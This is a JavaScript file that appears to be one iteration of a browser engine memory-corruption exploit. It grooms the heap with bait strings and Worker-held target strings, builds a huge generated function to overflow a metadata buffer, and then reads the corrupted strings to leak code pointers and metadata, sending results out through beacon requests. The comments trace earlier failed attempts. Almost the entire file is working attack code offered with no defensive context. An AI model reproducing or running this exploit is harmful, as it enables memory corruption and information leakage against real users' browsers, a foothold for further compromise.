// p156 — Bait-string grooming (restoring p146's proven strategy)
// ROOT CAUSE of p155 failure: NO heap grooming → metadata buffer lands ABOVE
// Worker strings → forward sweep misses them entirely.
//
// p146 WORKED because:
//   1. Main allocates 20 BAIT strings (100K chars → ~102KB StringImpl → marge slot)
//   2. Worker allocates 14 TARGET strings (same size, HIGHER addresses)
//   3. Main FREES baits + GC → freed slots at LOW address
//   4. Metadata buffer (~100KB) reuses freed bait slot (first-fit = lowest)
//   5. finishCreation writes 4.29GB FORWARD → through Worker targets
//
// p154 failed because it groomed with ArrayBuffers (Auxiliary heap).
// p155 failed because it removed ALL grooming.
// p156 restores p146's STRING grooming + adds p155's detailed extraction.
//
// Beacon prefix: V156-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V156-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  // ── WORKER (via function.toString, like p146) ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V156-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        var found = false;
        var iterations = 0;
        var rpt = {};

        // Tight busy-loop like p146 (NOT setTimeout)
        while (iterations < 5000000) {
          for (var i = 0; i < targets.length; i++) {
            try {
              var len = targets[i].length;
              if (len !== STR_LEN && !rpt['h' + i]) {
                rpt['h' + i] = 1;
                found = true;
                beacon('H-' + i + '-len=' + len + '-it=' + iterations);
              }
              if (len === STR_LEN) {
                var c8 = targets[i].charCodeAt(8);
                var c24 = targets[i].charCodeAt(24);
                var c56 = targets[i].charCodeAt(56);
                if (c8 !== CANARY || c24 !== CANARY || c56 !== CANARY) {
                  if (!rpt['d' + i]) {
                    rpt['d' + i] = 1;
                    found = true;
                    beacon('D-' + i + '-c8=' + hx(c8) + '-c24=' + hx(c24) + '-c56=' + hx(c56));
                  }
                }
              }
            } catch(e) {
              if (!rpt['e' + i]) {
                rpt['e' + i] = 1;
                found = true;
                beacon('ERR-' + i + '-it=' + iterations);
              }
            }
          }
          iterations++;
          if (iterations % 500000 === 0) beacon('POLL-' + iterations);
          if (found) break;
        }

        if (!found) {
          beacon('TIMEOUT-' + iterations);
          return;
        }

        // ── EXTRACTION PHASE ──
        // Scan ALL strings for corruption details
        beacon('EXTRACTING');
        for (var i = 0; i < targets.length; i++) {
          try {
            var len = targets[i].length;
            if (len !== STR_LEN) {
              // Header corrupted — .length changed
              beacon('HL-' + i + '-len=' + len);

              // If new length is small enough, try reading through corrupted m_fiber
              if (len > 0 && len < 500000) {
                var hex = '';
                for (var j = 0; j < Math.min(64, len); j++) {
                  try { hex += hx(targets[i].charCodeAt(j)); }
                  catch(e) { hex += 'XX'; break; }
                }
                beacon('HD-' + i + '-' + hex.substring(0, 200));
              }
              continue;
            }

            // Header intact — check data region
            var start = -1;
            for (var s = 0; s < 120; s++) {
              try {
                if (targets[i].charCodeAt(s) !== CANARY) { start = s; break; }
              } catch(e) { start = s; break; }
            }
            if (start < 0) continue;

            beacon('DS-' + i + '-off=' + start);

            // Read full 112-byte metadata entry from start
            var hex = '';
            for (var b = start; b < start + 112 && b < STR_LEN; b++) {
              try { hex += hx(targets[i].charCodeAt(b)); }
              catch(e) { hex += 'XX'; break; }
            }
            // Beacon in chunks (URL limit ~2KB)
            beacon('E1-' + i + '-' + hex.substring(0, 160));
            if (hex.length > 160) beacon('E2-' + i + '-' + hex.substring(160));

            // Extract potential code pointer at entry+24 (m_slowPathCallDestination)
            var ptrOff = start + 24;
            if (ptrOff + 8 <= STR_LEN) {
              var ptr = '';
              for (var p = ptrOff; p < ptrOff + 8; p++) {
                try { ptr += hx(targets[i].charCodeAt(p)); }
                catch(e) { ptr += 'XX'; break; }
              }
              beacon('PTR-' + i + '-' + ptr);
            }

            // Extract m_bytecodeIndex at entry+68
            var idxOff = start + 68;
            if (idxOff + 4 <= STR_LEN) {
              var idx = '';
              for (var d = idxOff; d < idxOff + 4; d++) {
                try { idx += hx(targets[i].charCodeAt(d)); }
                catch(e) { idx += 'XX'; break; }
              }
              beacon('IDX-' + i + '-' + idx);
            }

            // Read 8-byte values at 8-byte intervals (pointer scan)
            var ptrs = '';
            for (var p = start; p < start + 112 && p + 8 <= STR_LEN; p += 8) {
              var nz = false;
              for (var v = 0; v < 8; v++) {
                try { if (targets[i].charCodeAt(p + v) !== 0 && targets[i].charCodeAt(p + v) !== CANARY) { nz = true; break; } }
                catch(e) { nz = true; break; }
              }
              if (nz) {
                var h8 = '';
                for (var hh = 0; hh < 8; hh++) {
                  try { h8 += hx(targets[i].charCodeAt(p + hh)); }
                  catch(e) { h8 += 'XX'; break; }
                }
                ptrs += (p - start) + ':' + h8 + ' ';
              }
            }
            if (ptrs) beacon('PP-' + i + '-' + ptrs.substring(0, 200));
          } catch(e) {
            beacon('XERR-' + i);
          }
        }
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS (Primary heap, same marge size class) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS (higher addresses) ──
  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE BAITS + GC PRESSURE ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-DONE-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD OVERFLOW ──
  function phaseBuild() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;
    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__v156fn=function(a){'];
    for (var ch = 0; ch < chunksN; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v156ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__v156ok ? 'OK' : 'FAIL'));
      if (!window.__v156fn) { B('NO-FN'); return; }

      // Start Worker watching, then call after 200ms
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v156fn(function(){});
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 50));
        }
        B('SURVIVED');
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }
})();
